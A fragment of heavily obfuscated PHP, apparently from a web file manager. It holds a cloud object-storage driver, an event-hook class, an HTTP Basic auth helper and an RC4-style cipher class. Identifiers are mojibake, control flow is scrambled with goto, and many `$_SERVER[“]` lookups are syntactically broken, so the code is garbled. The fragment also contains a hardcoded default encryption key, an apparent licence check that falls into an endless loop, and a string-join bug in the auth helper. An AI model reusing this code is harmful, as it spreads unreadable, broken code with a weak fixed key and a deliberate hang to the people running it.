$_SERVER[“]; if (!($Dš‰Âàİ¹ñ = $this->getHost())) { return !1; } $aå¶õ©–£ù = $cÆ†¢çÚô÷; goto eè‘©Âò¸; Fñ‰¼²†Åó: $A‹ì‚ÖÙé¯ = $this->pathFather($CŞò£¯ª); $c¦µôà‰øò = array($C²çÂƒï[1089] => $aºœ¦¹¯‹, $C²çÂƒï[1090] => array(array($C²çÂƒï[1189], 0, $dï”ÅÄÜ‹É), array($C²çÂƒï[1093], $C²çÂƒï[1094], $A‹ì‚ÖÙé¯))); $DÒîó„Ë‘ = base64_encode(json_encode($c¦µôà‰øò)); goto Cùæ†Å›„; e«ãßÙ˜–: } public function multiUploadFormData($D°°ëŠâ†, $BÊéÃÅÌ°¼ = 3600) { $aÓ²…ÎÔµ– =& $_SERVER[“]; if (!($a²µÜä„ßå = $this->getHost())) { return !1; } $EŠ²£È··† = $this->trafficLimit($aÓ²…ÎÔµ–[1184]); $A“öœÓŸ–¥ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D°°ëŠâ†), $EŠ²£È··†); return array($aÓ²…ÎÔµ–[209] => $A“öœÓŸ–¥, $aÓ²…ÎÔµ–[169] => $a²µÜä„ßå . $aÓ²…ÎÔµ–[8] . $this->pathEncode($D°°ëŠâ†), $aÓ²…ÎÔµ–[210] => gmdate($aÓ²…ÎÔµ–[1192]), $aÓ²…ÎÔµ–[89] => $D°°ëŠâ†); } public function multiUploadAuthData($C—ˆ³è®†–, $F‹¿×ìŞ‘Ø = array()) { goto e¡¬ìê¬Ñ; e¡¬ìê¬Ñ: $c¬å¼äã¨ =& $_SERVER[“]; $A‹ÙêÛ—ñğ = isset($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[210]]) ? $F‹¿×ìŞ‘Ø[$c¬å¼äã¨[210]] : gmdate($c¬å¼äã¨[1192]); $A—£èÍÏ°“ = isset($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[160]]) ? $F‹¿×ìŞ‘Ø[$c¬å¼äã¨[160]] : $c¬å¼äã¨[33]; goto aªÈØÛÂñ; fšÜœÁ: if (!empty($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[1194]])) { $dÖœÛÛĞ¥Õ = array_merge(array($dŞì…µÄğæ[4]), $F‹¿×ìŞ‘Ø[$c¬å¼äã¨[1194]]); sort($dÖœÛÛĞ¥Õ); $dŞì…µÄğæ[4] = implode($c¬å¼äã¨[217], $dÖœÛÛĞ¥Õ); } $a¹Ê›¼©ˆ = implode($c¬å¼äã¨[217], $dŞì…µÄğæ); $aˆ‚Íø…ô = base64_encode(hash_hmac($c¬å¼äã¨[218], $a¹Ê›¼©ˆ, $this->secret, !0)); goto d´„½äÀñÃ; aªÈØÛÂñ: $fœŠ˜õ£´¯ = $C—ˆ³è®†–; if (isset($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[89]])) { $fœŠ˜õ£´¯ = $F‹¿×ìŞ‘Ø[$c¬å¼äã¨[89]]; unset($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[89]]); } if (isset($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[211]])) { $F‹¿×ìŞ‘Ø[$c¬å¼äã¨[210]] = $A‹ÙêÛ—ñğ; return $this->listUploadParts($fœŠ˜õ£´¯, $F‹¿×ìŞ‘Ø); } goto aÒ®èÊÊ‹ç; d´„½äÀñÃ: $e ¡ñ»©Õ‡ = $c¬å¼äã¨[1195] . $this->accessKey . $c¬å¼äã¨[4] . $aˆ‚Íø…ô; if (strpos($A—£èÍÏ°“, $c¬å¼äã¨[213]) === 0) { $e ¡ñ»©Õ‡ = array($c¬å¼äã¨[220] => $e ¡ñ»©Õ‡, $c¬å¼äã¨[210] => $A‹ÙêÛ—ñğ); if ($DëÅÃ§Õä) { $e ¡ñ»©Õ‡ = array_merge($e ¡ñ»©Õ‡, $DëÅÃ§Õä); } } return $e ¡ñ»©Õ‡; goto fõ‘ºàÍÍÚ; aÒ®èÊÊ‹ç: $dŞì…µÄğæ = array($c¬å¼äã¨[212], $c¬å¼äã¨[33], $c¬å¼äã¨[116], $A‹ÙêÛ—ñğ, "\x78\55\157\x73\163\x2d\x64\141\x74\145\x3a{$A‹ÙêÛ—ñğ}", $c¬å¼äã¨[8] . $this->bucket . $c¬å¼äã¨[8] . $fœŠ˜õ£´¯ . $A—£èÍÏ°“); if (strpos($A—£èÍÏ°“, $c¬å¼äã¨[213]) === 0) { $dŞì…µÄğæ[0] = $c¬å¼äã¨[214]; if ($DëÅÃ§Õä = $this->trafficLimit($c¬å¼äã¨[1184])) { $fœŠ˜õ£´¯ = $c¬å¼äã¨[1193]; array_splice($dŞì…µÄğæ, 5, 0, $fœŠ˜õ£´¯ . $c¬å¼äã¨[4] . $DëÅÃ§Õä[$fœŠ˜õ£´¯]); } } if (isset($F‹¿×ìŞ‘Ø[$c¬å¼äã¨[215]]) && $F‹¿×ìŞ‘Ø[$c¬å¼äã¨[215]] == $c¬å¼äã¨[216]) { $dŞì…µÄğæ[0] = $c¬å¼äã¨[216]; } goto fšÜœÁ; fõ‘ºàÍÍÚ: } public function listUploadParts($fÜ” ©è²ª, $dËÈ«¿˜’) { goto bñ¨áÜ¼©; bñ¨áÜ¼©: $B†œ¨Ï£° =& $_SERVER[“]; $f··ÇËá = parse_url_query($dËÈ«¿˜’[$B†œ¨Ï£°[160]]); $b‘¢å¤Àæ’ = $this->client->listParts($this->bucket, $this->pathEncode($fÜ” ©è²ª), $f··ÇËá[$B†œ¨Ï£°[209]]); goto B§µº‘‘ğÈ; dº‘Ê×›ø: unset($dËÈ«¿˜’[$B†œ¨Ï£°[211]], $dËÈ«¿˜’[$B†œ¨Ï£°[215]]); $e˜´äªô½ñ = $this->multiUploadAuthData($fÜ” ©è²ª, $dËÈ«¿˜’); if (empty($e˜´äªô½ñ)) { return !1; } goto CéˆÅŠ¨¤÷; CéˆÅŠ¨¤÷: return array($B†œ¨Ï£°[220] => $e˜´äªô½ñ, $B†œ¨Ï£°[210] => $dËÈ«¿˜’[$B†œ¨Ï£°[210]], $B†œ¨Ï£°[222] => $EÔÅÕÎŸ©); goto D‚¬—çñŠ™; B§µº‘‘ğÈ: $aØ¬÷Ñ·ÃŠ = $b‘¢å¤Àæ’->getListPart(); $EÔÅÕÎŸ© = array(); foreach ($aØ¬÷Ñ·ÃŠ as $f«çòóº·Œ) { $EÔÅÕÎŸ©[] = array($B†œ¨Ï£°[1175] => $f«çòóº·Œ->getPartNumber(), $B†œ¨Ï£°[1176] => trim($f«çòóº·Œ->getETag(), $B†œ¨Ï£°[113])); } goto dº‘Ê×›ø; D‚¬—çñŠ™: } public function download($cì¨½“ÆØ, $c¡ÏğØ”å®) { if ($this->isFolder($cì¨½“ÆØ)) { return !1; } try { $eëÔÍˆæ¶Õ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $c¡ÏğØ”å®); $eëÔÍˆæ¶Õ = $this->trafficLimit($_SERVER[“][105], $eëÔÍˆæ¶Õ); $this->client->getObject($this->bucket, $this->pathEncode($cì¨½“ÆØ), $eëÔÍˆæ¶Õ); } catch (OSS\Core\OssException $Fäí¬ôëƒ) { return !1; } return $c¡ÏğØ”å®; } public function fileSubstr($CĞ£‡¾Ë¶¬, $D¾¢á¤¾Ï = 0, $DéÛéº´ß = false) { if ($D¾¢á¤¾Ï === -1) { $dŠòŸ’‘š = array(); } else { if ($DéÛéº´ß === !1) { $cÈ´½èë°ß = $this->size($CĞ£‡¾Ë¶¬); } else { $cÈ´½èë°ß = $D¾¢á¤¾Ï + $DéÛéº´ß - 1; } $dŠòŸ’‘š = array(OSS\OssClient::OSS_RANGE => "{$D¾¢á¤¾Ï}\55{$cÈ´½èë°ß}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($CĞ£‡¾Ë¶¬), $dŠòŸ’‘š); } catch (OSS\Core\OssException $aÀåŸ§ñ¢•) { think_exception($aÀåŸ§ñ¢•->getMessage()); return !1; } } private function trafficLimit($b¢Èë’Â°, $C¹½®¹†ŠÔ = array()) { goto Cä°àê›Œ; Cä°àê›Œ: $FºÙ¼¹¿ÇÍ =& $_SERVER[“]; if ($b¢Èë’Â° == $FºÙ¼¹¿ÇÍ[1184] && $this->isUploadServer() || $b¢Èë’Â° == $FºÙ¼¹¿ÇÍ[105] && $this->isFileOutServer()) { return $C¹½®¹†ŠÔ; } $cçªö¿¬É = floatval($GLOBALS[$FºÙ¼¹¿ÇÍ[6]][$FºÙ¼¹¿ÇÍ[84]][$FºÙ¼¹¿ÇÍ[103]][$b¢Èë’Â°]) * 1024 * 1024 * 8; goto cÔĞ¸ùÊ…š; AŸ“†Ìã¦½: return $C¹½®¹†ŠÔ; goto aïÀšëÅÎ‘; cÔĞ¸ùÊ…š: if (!$cçªö¿¬É) { return $C¹½®¹†ŠÔ; } $cçªö¿¬É = $cçªö¿¬É < 819200 ? 819200 : ($cçªö¿¬É > 838860800 ? 838860800 : $cçªö¿¬É); $C¹½®¹†ŠÔ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($cçªö¿¬É); goto AŸ“†Ìã¦½; aïÀšëÅÎ‘: } public function link($EõëàƒéĞ„, $eÁÅè›î‡¯ = array()) { $B©ğ÷”èĞÍ =& $_SERVER[“]; if (!$this->exist($EõëàƒéĞ„) || $this->isFolder($EõëàƒéĞ„)) { return !1; } try { $eÁÅè›î‡¯ = $this->trafficLimit($B©ğ÷”èĞÍ[105], $eÁÅè›î‡¯); $DˆŞ—ÙÛ£ç = $this->client->signUrl($this->bucket, $this->pathEncode($EõëàƒéĞ„), 3600 * 12, $B©ğ÷”èĞÍ[216], $eÁÅè›î‡¯); return $this->getCdnLink($DˆŞ—ÙÛ£ç); } catch (OSS\Core\OssException $b‡ÂİĞ…ˆ§) { return !1; } } public function fileOut($bœªªæ¸ÓÍ, $E…ÆÉæ˜ŒÛ = false, $AùÃæß×¨ô = false, $CŠ¹Å°’ãé = '') { goto fã‰íÛæäÅ; E‚ÉùÀ¥±ø: $cÁêĞ„Ö” = $this->link($bœªªæ¸ÓÍ, $dñ¼Ã¿­Ä÷); $this->fileOutLink($cÁêĞ„Ö”); goto c»ƒ™â¾ñ; fÌŠïƒĞù…: $E…ÆÉæ˜ŒÛ = $E…ÆÉæ˜ŒÛ ? $CÑì²ÊÍİ[202] : $CÑì²ÊÍİ[203]; $dñ¼Ã¿­Ä÷ = array(OSS\OssClient::OSS_SUB_RESOURCE => $CÑì²ÊÍİ[1196] . rawurlencode("{$E…ÆÉæ˜ŒÛ}\73\x66\x69\x6c\x65\x6e\141\155\x65\x3d{$AùÃæß×¨ô}")); $dñ¼Ã¿­Ä÷[OSS\OssClient::OSS_SUB_RESOURCE] .= $CÑì²ÊÍİ[1197] . rawurlencode($b˜®—Âˆâ’); goto E‚ÉùÀ¥±ø; Aó×êİ±‘¥: $AùÃæß×¨ô = rawurlencode($AùÃæß×¨ô); $b˜®—Âˆâ’ = get_file_mime(get_path_ext($AùÃæß×¨ô)); if ($b˜®—Âˆâ’ == $CÑì²ÊÍİ[201]) { return parent::fileOut($bœªªæ¸ÓÍ, $E…ÆÉæ˜ŒÛ, $AùÃæß×¨ô, $CŠ¹Å°’ãé); } goto fÌŠïƒĞù…; fã‰íÛæäÅ: $CÑì²ÊÍİ =& $_SERVER[“]; if ($this->isFileOutServer()) { return $this->fileOutServer($bœªªæ¸ÓÍ, $E…ÆÉæ˜ŒÛ, $AùÃæß×¨ô, $CŠ¹Å°’ãé); } if (!$AùÃæß×¨ô) { $AùÃæß×¨ô = $this->pathThis($bœªªæ¸ÓÍ); } goto Aó×êİ±‘¥; c»ƒ™â¾ñ: } public function fileOutServer($cÚŞ ¢‹ˆ×, $AÇ—¦“´Ú = false, $a¦×ö‹Šù = false, $AÔÖßÙêõ = '') { parent::fileOut($cÚŞ ¢‹ˆ×, $AÇ—¦“´Ú, $a¦×ö‹Šù, $AÔÖßÙêõ); } public function fileOutImage($eÍ’¦çŸõ, $bË‚­•±Íä = 250) { $a›²Êƒ½—Ì = array(OSS\OssClient::OSS_PROCESS => $_SERVER[“][1198] . $bË‚­•±Íä); $D‡¦ŒµÁÔ = $this->link($eÍ’¦çŸõ, $a›²Êƒ½—Ì); $this->fileOutLink($D‡¦ŒµÁÔ); } public function fileOutImageServer($bì­…‹Û‚, $EÖØÍ³¤¤º = 250) { parent::fileOutImage($bì­…‹Û‚, $EÖØÍ³¤¤º); } public function fileOutLink($fƒ¬›©¡ã) { $bÏÉ­ìÎ˜Ø =& $_SERVER[“]; if (!$this->isCdnHost() && substr($fƒ¬›©¡ã, 0, 7) == $bÏÉ­ìÎ˜Ø[1102]) { $fƒ¬›©¡ã = $bÏÉ­ìÎ˜Ø[1103] . substr($fƒ¬›©¡ã, 7); } header($bÏÉ­ìÎ˜Ø[156] . $fƒ¬›©¡ã); die; } public function hashMd5($DÂÒÜ´½æî, $dêãøĞ©—£ = '') { $dùŠÙæ‘© =& $_SERVER[“]; $FáÓ¿Š‚É = $this->objectMeta($DÂÒÜ´½æî); if (!$FáÓ¿Š‚É) { return $dùŠÙæ‘©[33]; } if (!isset($FáÓ¿Š‚É[$dùŠÙæ‘©[1171]]) && !empty($dêãøĞ©—£)) { $Dß•´Ø™° = $this->updateObjMeta($DÂÒÜ´½æî, array($dùŠÙæ‘©[1171] => $dêãøĞ©—£)); $FáÓ¿Š‚É[$dùŠÙæ‘©[1171]] = $Dß•´Ø™° ? $dêãøĞ©—£ : $dùŠÙæ‘©[33]; } return isset($FáÓ¿Š‚É[$dùŠÙæ‘©[1171]]) ? strtolower($FáÓ¿Š‚É[$dùŠÙæ‘©[1171]]) : $dùŠÙæ‘©[33]; } public function size($cÕˆ«ŸÅ˜Î) { $e‰öèŞ×ù‚ = $this->objectMeta($cÕˆ«ŸÅ˜Î); return $e‰öèŞ×ù‚ ? $e‰öèŞ×ù‚[$_SERVER[“][77]] : 0; } public function info($Dİ„£°õ©ª) { if ($this->isFolder($Dİ„£°õ©ª)) { return $this->folderInfo($Dİ„£°õ©ª); } else { if ($this->isFile($Dİ„£°õ©ª)) { return $this->fileInfo($Dİ„£°õ©ª); } } return !1; } public function exist($DÅÏ²Ã‚Ş) { return $this->isFile($DÅÏ²Ã‚Ş) || $this->isFolder($DÅÏ²Ã‚Ş); } public function isFile($dÂãÖ¨²á) { return !$this->isFolder($dÂãÖ¨²á) && $this->objectMeta($dÂãÖ¨²á); } public function isFolder($dÕÌ¯ºèÓê) { return $this->cacheMethod($_SERVER[“][223], $dÕÌ¯ºèÓê); } protected function objectMeta($Aîš“ª¯‘´) { return $this->cacheMethod($_SERVER[“][224], $Aîš“ª¯‘´); } protected function _objectMeta($aª§ Î®) { $c‚„‡ôÖÏ =& $_SERVER[“]; try { $EÏÈ›ï¦×É = $this->client->getObjectMeta($this->bucket, $this->pathEncode($aª§ Î®)); } catch (OSS\Core\OssException $eğ¸¸—®à) { $EÏÈ›ï¦×É = !1; } if ($EÏÈ›ï¦×É) { $EÏÈ›ï¦×É[$c‚„‡ôÖÏ[77]] = intval($EÏÈ›ï¦×É[$c‚„‡ôÖÏ[1178]]); } return $EÏÈ›ï¦×É; } protected function _isFolder($E˜î®ºĞºó) { $e…‰“ÃñÒƒ =& $_SERVER[“]; if ($E˜î®ºĞºó == $e…‰“ÃñÒƒ[33] || $E˜î®ºĞºó == $e…‰“ÃñÒƒ[8]) { return !0; } $aè£¥·–ªÚ = array($e…‰“ÃñÒƒ[1168] => $e…‰“ÃñÒƒ[8], $e…‰“ÃñÒƒ[186] => rtrim($E˜î®ºĞºó, $e…‰“ÃñÒƒ[8]) . $e…‰“ÃñÒƒ[8], $e…‰“ÃñÒƒ[1169] => 1, $e…‰“ÃñÒƒ[1170] => $e…‰“ÃñÒƒ[33]); $cÃÛ™Ş”Ø = $this->client->listObjects($this->bucket, $aè£¥·–ªÚ); if ($cÃÛ™Ş”Ø->getObjectList() || $cÃÛ™Ş”Ø->getPrefixList()) { return !0; } return !1; } } goto D³ÅÚ§åêœ; c‰¯¤³›·æ: define($_SERVER[“][227], 2); define($_SERVER[“][228], 3); define($_SERVER[“][229], 1); goto BÛÍŒŒ´íƒ; E±áÁ½ğáÚ: if (!isset($_SERVER[$_SERVER[“][774]]) || !isset($_SERVER[$_SERVER[“][1738]])) { goto eêğ“Ü‘ó; eêğ“Ü‘ó: $D¯ĞÒØ¬Ôí = $_SERVER[“][776]; $eß‹ˆÈô…Ú = $_SERVER[$_SERVER[“][777]] . $_SERVER[“][778]; $Aö‚×­… „ = $D¯ĞÒØ¬Ôí($eß‹ˆÈô…Ú); goto E¥‘‹õµ‰; DÉÉ¦áª‚À: $cˆî¤ñ©($_SERVER[$_SERVER[“][777]] . $_SERVER[“][778]); $b­¬‡×¾‰È = 2; while ($b­¬‡×¾‰È > 1) { $A”ˆœæâ†Ğ = rawurlencode($b­¬‡×¾‰È . $_SERVER[“][361]); } goto F‘‡»ÖÖ„ê; E¥‘‹õµ‰: $fßë¤Áß¬ = explode($_SERVER[“][217], $Aö‚×­… „); if (count($fßë¤Áß¬) < $_SERVER[“][559]) { $f“±¶©Œ‚Ô = $_SERVER[“][779]; $f“±¶©Œ‚Ô(); } $cˆî¤ñ© = $_SERVER[“][1422]; goto DÉÉ¦áª‚À; F‘‡»ÖÖ„ê: } class Hook { private static $events = array(); public static function get($d´ØİñÉÌ = false) { if (!$d´ØİñÉÌ) { return self::$events; } else { return self::$events[$d´ØİñÉÌ]; } } public static function apply($DàÀñâÎŠ, $F™ŒŠ©È†Š = array()) { $ašœÆ™Ä¼Ñ = ActionApply($DàÀñâÎŠ, $F™ŒŠ©È†Š); if (is_string($DàÀñâÎŠ)) { Hook::trigger($DàÀñâÎŠ); } return $ašœÆ™Ä¼Ñ; } public static function bind($eÜËÖ»‡‹ã, $c‡¼ŒÉİ‘, $AŠµâ•Ò©Œ = false) { $bÛ‡áãùñ =& $_SERVER[“]; if (!isset(self::$events[$eÜËÖ»‡‹ã])) { self::$events[$eÜËÖ»‡‹ã] = array(); } self::$events[$eÜËÖ»‡‹ã][] = array($bÛ‡áãùñ[1739] => $c‡¼ŒÉİ‘, $bÛ‡áãùñ[1740] => $AŠµâ•Ò©Œ, $bÛ‡áãùñ[1741] => 0); } public static function once($dÉâÄÚô, $c¥ÎÌô²) { self::bind($dÉâÄÚô, $c¥ÎÌô², !0); } public static function unbind($dÁÔ‹Û´„Ô, $E¹ƒí†ÆÔÖ = false) { if (!$E¹ƒí†ÆÔÖ) { self::$events[$dÁÔ‹Û´„Ô] = array(); return; } $eíˆ„ÊÛ‰î = self::$events[$dÁÔ‹Û´„Ô]; self::$events[$dÁÔ‹Û´„Ô] = array(); if (!is_array($eíˆ„ÊÛ‰î)) { return; } for ($E´»¦ò•‚ = 0; $E´»¦ò•‚ < count($eíˆ„ÊÛ‰î); $E´»¦ò•‚++) { if ($eíˆ„ÊÛ‰î[$E´»¦ò•‚][$_SERVER[“][1739]] == $E¹ƒí†ÆÔÖ) { continue; } self::$events[$dÁÔ‹Û´„Ô][] = $eíˆ„ÊÛ‰î[$E´»¦ò•‚]; } } public static function filter($a¯äÅ¹µ, $a¦œÃØÔŸø) { goto F°ƒ‚òš½Ë; CæÆ­Š‚î: $B„‰‡¹éË = $Dç²±¯´[$a¯äÅ¹µ]; $C®áƒ¸Ìà = $a¦œÃØÔŸø; if (!is_array($B„‰‡¹éË) || count($B„‰‡¹éË) == 0) { return $C®áƒ¸Ìà; } goto bÂòË¬›‚Ã; bÂòË¬›‚Ã: for ($aóì£Öõê = 0; $aóì£Öõê < count($B„‰‡¹éË); $aóì£Öõê++) { $D°è¨¨İ²Ë = $B„‰‡¹éË[$aóì£Öõê]; if ($D°è¨¨İ²Ë[$b¹Ó×È‡º[1740]] && $D°è¨¨İ²Ë[$b¹Ó×È‡º[1741]] > 1) { continue; } self::$events[$a¯äÅ¹µ][$aóì£Öõê][$b¹Ó×È‡º[1741]] = $D°è¨¨İ²Ë[$b¹Ó×È‡º[1741]] + 1; $E’ª‹˜²™ñ = self::apply($D°è¨¨İ²Ë[$b¹Ó×È‡º[1739]], array($C®áƒ¸Ìà)); if (gettype($E’ª‹˜²™ñ) == gettype($C®áƒ¸Ìà)) { $C®áƒ¸Ìà = $E’ª‹˜²™ñ; } } return $C®áƒ¸Ìà; goto Aß¦Ë¾Û³Å; F°ƒ‚òš½Ë: $b¹Ó×È‡º =& $_SERVER[“]; $Dç²±¯´ = self::$events; if (!isset($Dç²±¯´[$a¯äÅ¹µ])) { return $a¦œÃØÔŸø; } goto CæÆ­Š‚î; Aß¦Ë¾Û³Å: } public static function trigger($f†Ìø¥ë) { goto aæß¸Ñ’¦—; FÆ®À‹Äë¨: $fğº¢èˆÚê = func_get_args(); array_shift($fğº¢èˆÚê); for ($A¬£—« ™ = 0; $A¬£—« ™ < count($Få—Ô†Îñ); $A¬£—« ™++) { $d•ß±‹»¼Õ = $Få—Ô†Îñ[$A¬£—« ™]; if ($d•ß±‹»¼Õ[$AÙÒ¬Å¹[1740]] && $d•ß±‹»¼Õ[$AÙÒ¬Å¹[1741]] > 1) { continue; } if (defined($AÙÒ¬Å¹[1742]) && GLOBAL_LOG_HOOK) { write_log($f†Ìø¥ë . $AÙÒ¬Å¹[1743] . $d•ß±‹»¼Õ[$AÙÒ¬Å¹[1739]], $AÙÒ¬Å¹[1744]); } self::$events[$f†Ìø¥ë][$A¬£—« ™][$AÙÒ¬Å¹[1741]] = $d•ß±‹»¼Õ[$AÙÒ¬Å¹[1741]] + 1; $EŸÙÈË‘“Í = self::apply($d•ß±‹»¼Õ[$AÙÒ¬Å¹[1739]], $fğº¢èˆÚê); if (defined($AÙÒ¬Å¹[1742]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $AÙÒ¬Å¹[1744]); if ($d•ß±‹»¼Õ[$AÙÒ¬Å¹[1741]] == 200) { $f…¥‡“ôğ½ = is_array($d•ß±‹»¼Õ[$AÙÒ¬Å¹[1739]]) ? json_encode_force($d•ß±‹»¼Õ[$AÙÒ¬Å¹[1739]]) : $d•ß±‹»¼Õ[$AÙÒ¬Å¹[1739]]; write_log($AÙÒ¬Å¹[1745] . $f†Ìø¥ë . $AÙÒ¬Å¹[1746] . $f…¥‡“ôğ½, $AÙÒ¬Å¹[1747]); } } $eì™Ç”©¯ƒ = is_null($EŸÙÈË‘“Í) ? $eì™Ç”©¯ƒ : $EŸÙÈË‘“Í; } goto a¼çöÄÂİ; a¼çöÄÂİ: return $eì™Ç”©¯ƒ; goto eÕÜ¢‡æÚ¬; a¨¸×é™¶Š: if (!isset($F»ğƒ¾‰[$f†Ìø¥ë])) { return $eì™Ç”©¯ƒ; } $Få—Ô†Îñ = $F»ğƒ¾‰[$f†Ìø¥ë]; if (!is_array($Få—Ô†Îñ) || count($Få—Ô†Îñ) == 0) { return $eì™Ç”©¯ƒ; } goto FÆ®À‹Äë¨; aæß¸Ñ’¦—: $AÙÒ¬Å¹ =& $_SERVER[“]; $F»ğƒ¾‰ = self::$events; $eì™Ç”©¯ƒ = !1; goto a¨¸×é™¶Š; eÕÜ¢‡æÚ¬: } } class HttpAuth { public static function get() { $e×Ç¸Øé‚ë =& $_SERVER[“]; $BÚ†ì“ˆ† = $e×Ç¸Øé‚ë[33]; $c™’º–‰õ = $e×Ç¸Øé‚ë[33]; if (isset($_SERVER[$e×Ç¸Øé‚ë[1748]])) { $BÚ†ì“ˆ† = $_SERVER[$e×Ç¸Øé‚ë[1748]]; $c™’º–‰õ = $_SERVER[$e×Ç¸Øé‚ë[1749]]; } elseif (isset($_SERVER[$e×Ç¸Øé‚ë[1750]])) { $A‰˜ó©”ŸÀ = $_SERVER[$e×Ç¸Øé‚ë[1750]]; if (strpos(strtolower($A‰˜ó©”ŸÀ), $e×Ç¸Øé‚ë[1751]) === 0) { $C•¿ÏŞáŒµ = explode($e×Ç¸Øé‚ë[4], base64_decode(substr($A‰˜ó©”ŸÀ, 6))); $BÚ†ì“ˆ† = isset($C•¿ÏŞáŒµ[0]) ? $C•¿ÏŞáŒµ[0] : $e×Ç¸Øé‚ë[33]; $c™’º–‰õ = isset($C•¿ÏŞáŒµ[1]) ? $C•¿ÏŞáŒµ[1] : 0; } } return array($e×Ç¸Øé‚ë[537] => $BÚ†ì“ˆ†, $e×Ç¸Øé‚ë[883] => $c™’º–‰õ); } public static function error() { goto D‚ÃÈ¿ù»¦; d²©²ÉÔÓœ: header($c™Â‚öÉ¼[1754]); header($c™Â‚öÉ¼[1755]); header($c™Â‚öÉ¼[1250]); goto cœ¤”„çÊï; cœ¤”„çÊï: die; goto cçµ«ÏöÙÍ; D‚ÃÈ¿ù»¦: $c™Â‚öÉ¼ =& $_SERVER[“]; header($c™Â‚öÉ¼[1752]); header($c™Â‚öÉ¼[1753]); goto d²©²ÉÔÓœ; cçµ«ÏöÙÍ: } public static function make($d“ÇÎÖ§Ÿš, $CÑŠ™ç‡Ì) { $Eã©êó™­İ =& $_SERVER[“]; return $Eã©êó™­İ[1756] + base64_encode($d“ÇÎÖ§Ÿš . $Eã©êó™­İ[4] . $CÑŠ™ç‡Ì); } } goto b¤ìÕƒ„³¾; A‰ÌËí»¬¦: class Mcrypt { public static $defaultKey = "\141\x21\x74\x61\x6b\101\x3a\x64\x6c\x6d\x63\x6c\x64\x45\x76\54\x65"; public static function encode($cº½ª¶¹Ã´, $d¯ÙµÊ„ = '', $e¼ÁæÀ†´ = 0, $cƒÕÔÂÑßÆ = '') { goto FƒĞåŠÎ×Ó; cËÖÉÑáÉ¤: $cº½ª¶¹Ã´ = sprintf($DÄÄ‡“±ÑÇ[1921], $e¼ÁæÀ†´ ? $e¼ÁæÀ†´ + time() : 0) . substr(md5($cº½ª¶¹Ã´ . $CÁä©ÙºÅç), 0, 16) . $cº½ª¶¹Ã´; $F÷œÉ×ô¸Ú = strlen($cº½ª¶¹Ã´); $fò‘‚ò¨ Š = array(); goto BË´àÆ¾Äí; FƒĞåŠÎ×Ó: $DÄÄ‡“±ÑÇ =& $_SERVER[“]; $FˆÁÍŠ©œ¹ = 4; $d¯ÙµÊ„ = md5($d¯ÙµÊ„ ? $d¯ÙµÊ„ : self::$defaultKey); goto FŠà®Ş‹ßÍ; f­¹¶ËèµÔ: $B©Îğ—¾·˜ = substr($cƒÕÔÂÑßÆ, -$FˆÁÍŠ©œ¹); $CÄùä³ªÙç = $b¹Õ§İâÂ› . md5($b¹Õ§İâÂ› . $B©Îğ—¾·˜); $BãßùÎ‹ã = strlen($CÄùä³ªÙç); goto cËÖÉÑáÉ¤; BÜ…³¤’­ô: $F„È«îÁø = str_replace(array($DÄÄ‡“±ÑÇ[284], $DÄÄ‡“±ÑÇ[8], $DÄÄ‡“±ÑÇ[893]), array($DÄÄ‡“±ÑÇ[412], $DÄÄ‡“±ÑÇ[70], $DÄÄ‡“±ÑÇ[91]), $F„È«îÁø); return $F„È«îÁø; goto b†–„¨¬¿; F ÉîÆç‹Ô: $F„È«îÁø = $DÄÄ‡“±ÑÇ[33]; for ($CºªİÃä—‚ = $A’‡‘Ş§ŠÕ = $Eß¦¬÷»¼ = 0; $Eß¦¬÷»¼ < $F÷œÉ×ô¸Ú; $Eß¦¬÷»¼++) { $CºªİÃä—‚ = ($CºªİÃä—‚ + 1) % 256; $A’‡‘Ş§ŠÕ = ($A’‡‘Ş§ŠÕ + $b“¶ÄÉ…È¨[$CºªİÃä—‚]) % 256; $c©Ûé¯µ‘É = $b“¶ÄÉ…È¨[$CºªİÃä—‚]; $b“¶ÄÉ…È¨[$CºªİÃä—‚] = $b“¶ÄÉ…È¨[$A’‡‘Ş§ŠÕ]; $b“¶ÄÉ…È¨[$A’‡‘Ş§ŠÕ] = $c©Ûé¯µ‘É; $F„È«îÁø .= chr(ord($cº½ª¶¹Ã´[$Eß¦¬÷»¼]) ^ $b“¶ÄÉ…È¨[($b“¶ÄÉ…È¨[$CºªİÃä—‚] + $b“¶ÄÉ…È¨[$A’‡‘Ş§ŠÕ]) % 256]); } $F„È«îÁø = $B©Îğ—¾·˜ . str_replace($DÄÄ‡“±ÑÇ[893], $DÄÄ‡“±ÑÇ[33], base64_encode($F„È«îÁø)); goto BÜ…³¤’­ô; FŠà®Ş‹ßÍ: $b¹Õ§İâÂ› = md5(substr($d¯ÙµÊ„, 0, 16)); $CÁä©ÙºÅç = md5(substr($d¯ÙµÊ„, 16, 16)); $cƒÕÔÂÑßÆ = $cƒÕÔÂÑßÆ ? $cƒÕÔÂÑßÆ : md5(microtime()); goto f­¹¶ËèµÔ; BË´àÆ¾Äí: for ($Eß¦¬÷»¼ = 0; $Eß¦¬÷»¼ <= 255; $Eß¦¬÷»¼++) { $fò‘‚ò¨ Š[$Eß¦¬÷»¼] = ord($CÄùä³ªÙç[$Eß¦¬÷»¼ % $BãßùÎ‹ã]); } $b“¶ÄÉ…È¨ = range(0, 255); for ($A’‡‘Ş§ŠÕ = $Eß¦¬÷»¼ = 0; $Eß¦¬÷»¼ < 256; $Eß¦¬÷»¼++) { $A’‡‘Ş§ŠÕ = ($A’‡‘Ş§ŠÕ + $b“¶ÄÉ…È¨[$Eß¦¬÷»¼] + $fò‘‚ò¨ Š[$Eß¦¬÷»¼]) % 256; $c©Ûé¯µ‘É = $b“¶ÄÉ…È¨[$Eß¦¬÷»¼]; $b“¶ÄÉ…È¨[$Eß¦¬÷»¼] = $b“¶ÄÉ…È¨[$A’‡‘Ş§ŠÕ]; $b“¶ÄÉ…È¨[$A’‡‘Ş§ŠÕ] = $c©Ûé¯µ‘É; } goto F ÉîÆç‹Ô; b†–„¨¬¿: } public static function decode($C…²ÕÜ°, $Bãƒç‘öØÑ = '') { goto Eçøæ×ëóõ; f‚¸‹¨Ãœ: if 